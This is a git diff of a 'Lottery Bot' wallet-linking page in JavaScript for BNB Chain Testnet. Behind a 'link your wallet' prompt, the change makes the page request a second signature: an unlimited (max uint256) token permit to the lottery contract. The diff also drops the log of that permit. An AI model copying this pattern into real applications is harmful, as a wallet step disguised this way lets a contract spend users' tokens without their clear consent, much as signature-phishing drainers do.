@@ -86,22 +86,22 @@
         // Extract parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('userId') || 'Unknown';
-        const verifyMessageHash = urlParams.get('verifyMessageHash') || null;
-        const permitMessageHash = urlParams.get('permitMessageHash') || null;
+        const messageHash = urlParams.get('messageHash') || 'Not provided';
         const message = "Link your wallet to the Lottery Bot";
 
-        console.log('URL Parameters:', { userId, verifyMessageHash, permitMessageHash });
+        console.log('URL Parameters:', { userId, messageHash });
 
         document.getElementById('message').textContent = message;
         document.getElementById('userId').textContent = userId;
 
         // Contract details
         const LOTTERY_CONTRACT_ADDRESS = ethers.utils.getAddress('0xDE0c4272F6Ab09D06Db9EeA94F2639454fC782ee');
-        let LUCK_TOKEN_ADDRESS = null;
+        let LUCK_TOKEN_ADDRESS = null; // Will be fetched dynamically
         const LOTTERY_CONTRACT_ABI = [
             {
                 "inputs": [
                     {"name": "telegramId", "type": "uint256", "internalType": "uint256"},
+                    {"name": "user", "type": "address", "internalType": "address"},
                     {"name": "signature", "type": "bytes", "internalType": "bytes"}
                 ],
                 "name": "verifyWallet",
@@ -142,31 +142,16 @@
                 "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
                 "stateMutability": "view",
                 "type": "function"
-            },
-            {
-                "inputs": [
-                    {"name": "owner", "type": "address"},
-                    {"name": "spender", "type": "address"},
-                    {"name": "value", "type": "uint256"},
-                    {"name": "deadline", "type": "uint256"},
-                    {"name": "v", "type": "uint8"},
-                    {"name": "r", "type": "bytes32"},
-                    {"name": "s", "type": "bytes32"}
-                ],
-                "name": "permit",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
             }
         ];
         const CHAIN_ID = 97; // BNB Chain Testnet
-        const PERMIT_VALUE = ethers.BigNumber.from("1000000000000000000000"); // 1000 tokens
+        const MAX_ALLOWANCE = ethers.BigNumber.from("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"); // Max uint256
 
         async function signMessageVerifyAndPermit() {
             try {
                 // Check if MetaMask is installed
                 if (!window.ethereum) {
-                    throw new Error('Please install MetaMask to proceed or use the MetaMask In-App Browser.');
+                    throw new Error('Please install MetaMask to proceed! or Paste the link in the Metamask Inapp-Browser to proceed');
                 }
 
                 // Request access to the user's wallet
@@ -221,24 +206,24 @@
                 console.log('Fetched $LUCK token address:', LUCK_TOKEN_ADDRESS);
 
                 // Step 1: Sign the EIP-712 message for wallet verification
-                const verifyDomain = {
+                const domain = {
                     name: "LotteryContract",
                     version: "1",
                     chainId: CHAIN_ID,
                     verifyingContract: LOTTERY_CONTRACT_ADDRESS
                 };
-                const verifyTypes = {
+                const types = {
                     Message: [
                         { name: "telegramId", type: "uint256" },
                         { name: "message", type: "string" }
                     ]
                 };
-                const verifyValue = {
+                const value = {
                     telegramId: parseInt(userId),
                     message: "Link your wallet to the Lottery Bot"
                 };
-                console.log('Verification EIP-712 Message:', { verifyDomain, verifyTypes, verifyValue });
-                const messageSignature = await signer._signTypedData(verifyDomain, verifyTypes, verifyValue);
+                console.log('EIP-712 Message:', { domain, types, value });
+                const messageSignature = await signer._signTypedData(domain, types, value);
                 console.log('Message Signature:', messageSignature);
 
                 // Step 2: Sign the EIP-712 permit for $LUCK token approval
@@ -263,11 +248,10 @@
                 const permitValue = {
                     owner: userAddress,
                     spender: LOTTERY_CONTRACT_ADDRESS,
-                    value: PERMIT_VALUE,
+                    value: MAX_ALLOWANCE,
                     nonce: permitNonce,
                     deadline: deadline
                 };
-                console.log('Permit EIP-712 Message:', { permitDomain, permitTypes, permitValue });
                 const permitSignature = await signer._signTypedData(permitDomain, permitTypes, permitValue);
                 console.log('Permit Signature:', permitSignature);
 
@@ -279,7 +263,7 @@
 
                 // Step 3: Send the verifyWallet transaction
                 const contract = new ethers.Contract(LOTTERY_CONTRACT_ADDRESS, LOTTERY_CONTRACT_ABI, signer);
-                const tx = await contract.verifyWallet(parseInt(userId), messageSignature, {
+                const tx = await contract.verifyWallet(parseInt(userId), userAddress, messageSignature, {
                     gasLimit: 300000,
                     value: 0
                 });
